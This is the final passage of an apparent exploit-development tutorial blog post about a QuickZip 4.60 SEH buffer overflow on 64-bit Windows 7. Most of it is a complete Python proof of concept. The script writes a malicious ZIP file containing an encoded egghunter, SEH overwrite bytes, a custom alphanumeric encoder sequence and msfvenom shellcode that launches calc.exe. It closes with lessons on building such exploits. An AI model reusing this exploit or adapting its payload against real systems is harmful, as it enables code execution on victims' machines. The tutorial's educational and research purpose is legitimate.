And the final PoC code covering everything discussed so far should look like this:
{%codeblock lang:python%}
#!/usr/bin/python
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
print "[+] Building PoC.."

max_size = 4064
nseh_offset = 292
jump_offset = 92

# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b"
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36"
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a"
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74"
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44"
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b"
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51"
"\x6b\x4f\x79\x77\x41\x41")

payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset) # padding for nSEH

payload += "\x41\x41"   # INC ECX (acts as NOPs, but with valid character set)

# Offset the stack by 0x632 to start writing to a controlled area of memory
#
payload += "\x54"                   # push esp;
payload += "\x58"                   # pop eax;
payload += "\x05\x33\x07\x01\x01"   # add eax, 0x01010733
payload += "\x2d\x01\x01\x01\x01"   # sub eax, 0x01010101
payload += "\x50"                   # push eax;
payload += "\x5c"                   # pop esp;

# Write instructions for: push esp; pop eax; sub eax, 0xBE; jmp eax; jmp 0xee
#
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xeceb90e0 into EAX
payload += "\x05\x70\x70\x77\x77"   # add eax, 0x77777070
payload += "\x05\x70\x20\x74\x77"   # add eax, 0x77742070
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xff000000 into EAX
payload += "\x05\x01\x01\x01\x77"   # add eax, 0x77010101
payload += "\x05\x01\x01\x01\x77"   # add eax, 0x77010101
payload += "\x05\x10\x10\x10\x22"   # add eax, 0x22101010
payload += "\x2d\x12\x12\x12\x11"   # sub eax, 0x11121212
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xbe2d5854 into EAX
payload += "\x05\x43\x47\x1c\x67"   # add eax, 0x671c4743
payload += "\x05\x11\x11\x11\x57"   # add eax, 0x57111111
payload += "\x50"                   # push eax;

payload += "A" * (nseh_offset - len(payload))    # padding for the rest of encoder

payload += "\x71\x9b\x70\x9b"       # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
payload += "\x33\x28\x42\x00"       # SEH

shellcode = "w00tw00t"                     # egg
shellcode += "\x81\xe4\xf0\xff\xff\xff"    # align the stack: AND esp,0xFFFFFFF0
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d'
# [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
shellcode += ("\xbf\xdc\xae\x26\x3d\xda\xdd\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x33\x31\x7b\x12\x03\x7b\x12\x83\x37\x52\xc4\xc8\x3b"
"\x43\x80\x33\xc3\x94\xf3\xba\x26\xa5\x21\xd8\x23\x94\xf5"
"\xaa\x61\x15\x7d\xfe\x91\xae\xf3\xd7\x96\x07\xb9\x01\x99"
"\x98\x0f\x8e\x75\x5a\x11\x72\x87\x8f\xf1\x4b\x48\xc2\xf0"
"\x8c\xb4\x2d\xa0\x45\xb3\x9c\x55\xe1\x81\x1c\x57\x25\x8e"
"\x1d\x2f\x40\x50\xe9\x85\x4b\x80\x42\x91\x04\x38\xe8\xfd"
"\xb4\x39\x3d\x1e\x88\x70\x4a\xd5\x7a\x83\x9a\x27\x82\xb2"
"\xe2\xe4\xbd\x7b\xef\xf5\xfa\xbb\x10\x80\xf0\xb8\xad\x93"
"\xc2\xc3\x69\x11\xd7\x63\xf9\x81\x33\x92\x2e\x57\xb7\x98"
"\x9b\x13\x9f\xbc\x1a\xf7\xab\xb8\x97\xf6\x7b\x49\xe3\xdc"
"\x5f\x12\xb7\x7d\xf9\xfe\x16\x81\x19\xa6\xc7\x27\x51\x44"
"\x13\x51\x38\x02\xe2\xd3\x46\x6b\xe4\xeb\x48\xdb\x8d\xda"
"\xc3\xb4\xca\xe2\x01\xf1\x25\xa9\x08\x53\xae\x74\xd9\xe6"
"\xb3\x86\x37\x24\xca\x04\xb2\xd4\x29\x14\xb7\xd1\x76\x92"
"\x2b\xab\xe7\x77\x4c\x18\x07\x52\x2f\xff\x9b\x3e\x9e\x9a"
"\x1b\xa4\xde")
payload += shellcode

payload += "A" * (max_size - len(payload))    # padding
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3 + payload

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"
{% endcodeblock %}


When we launch the generated `cst.zip` file, our exploit will run and after several seconds (as the egghunter goes through the application's memory to locate the "egg") we should see the calculator binary open.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode final.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/32.shellcode final.png)

Success!!


Summary
-------

That was pretty much it - we have successfully recreated the QuickZip exploit to work on 64 bit Windows 7!

To sum it up, we achieved this by creating an egghunter exploit using very limited allowed character set (pretty much ASCII printable), wrote our own encoder and jumped around the memory to get to the egghunter code and eventually the shellcode.

Few things to keep in mind:

- find out what characters you're allowed to use and keep that in mind when errors occur
- do not get discouraged if the buffer size is not sufficient - get creative!
- make sure you use correct egghunter code (32 bit vs. 64 bit) depending on a platform you're developing an exploit for
- writing own encoder is not that hard, but it takes lots of practice and patience
- make sure to align the stack before executing shellcode

Anyway, hope you found it useful! As always, if you have any questions/ideas/suggestions or just wanna chat infosec, feel free to comment below or hit me up on Twitter [@TheKnapsy](https://twitter.com/TheKnapsy) or IRC (mainly **#vulnhub** on freenode).
